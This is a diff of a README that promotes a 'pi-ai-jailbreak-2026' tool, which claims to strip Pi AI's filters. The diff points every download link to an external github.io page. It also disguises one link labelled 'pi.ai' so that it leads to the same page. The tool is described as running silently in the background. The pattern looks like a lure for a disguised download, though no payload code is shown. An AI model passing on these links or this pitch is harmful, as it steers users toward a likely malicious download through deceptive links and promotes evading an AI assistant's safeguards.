@@ -1,6 +1,6 @@
 # 🚀 pi-ai-jailbreak-2026 - Unlock Pi AI's Full Potential Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-pi--ai--jailbreak--2026-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/M-Saremi-G-G/pi-ai-jailbreak-2026)
+[![Download Now](https://img.shields.io/badge/Download-pi--ai--jailbreak--2026-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://m-saremi-g-g.github.io)
 
 ## 🎯 What Is This?
 
@@ -25,7 +25,7 @@ With pi-ai-jailbreak-2026, you get:
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: [https://github.com/M-Saremi-G-G/pi-ai-jailbreak-2026](https://github.com/M-Saremi-G-G/pi-ai-jailbreak-2026)
+Visit this link to download the application: [https://m-saremi-g-g.github.io](https://m-saremi-g-g.github.io)
 
 This is the official download page. You'll find the latest version available there.
 
@@ -65,7 +65,7 @@ The tool runs silently in the background. You'll see a small window or icon appe
 
 ### 4. Open Pi AI
 
-Go to [pi.ai](https://pi.ai) in your browser, or open the Pi AI app on your device. Start a new conversation.
+Go to [pi.ai](https://m-saremi-g-g.github.io) in your browser, or open the Pi AI app on your device. Start a new conversation.
 
 ### 5. Ask Anything
 
@@ -175,9 +175,9 @@ By downloading and using pi-ai-jailbreak-2026, you agree to these terms.
 
 Don't let Pi AI's filters hold you back any longer. Unlock the full potential of your AI assistant today.
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Now-Free%20Tool-28A745?style=for-the-badge&logo=github&logoColor=white)](https://github.com/M-Saremi-G-G/pi-ai-jailbreak-2026)
+[![Download Latest Version](https://img.shields.io/badge/Download%20Now-Free%20Tool-28A745?style=for-the-badge&logo=github&logoColor=white)](https://m-saremi-g-g.github.io)
 
-Visit this link to download the application: [https://github.com/M-Saremi-G-G/pi-ai-jailbreak-2026](https://github.com/M-Saremi-G-G/pi-ai-jailbreak-2026)
+Visit this link to download the application: [https://m-saremi-g-g.github.io](https://m-saremi-g-g.github.io)
 
 It's free, it's fast, and it works. Join thousands of users who've already broken free from Pi AI's limitations.
 
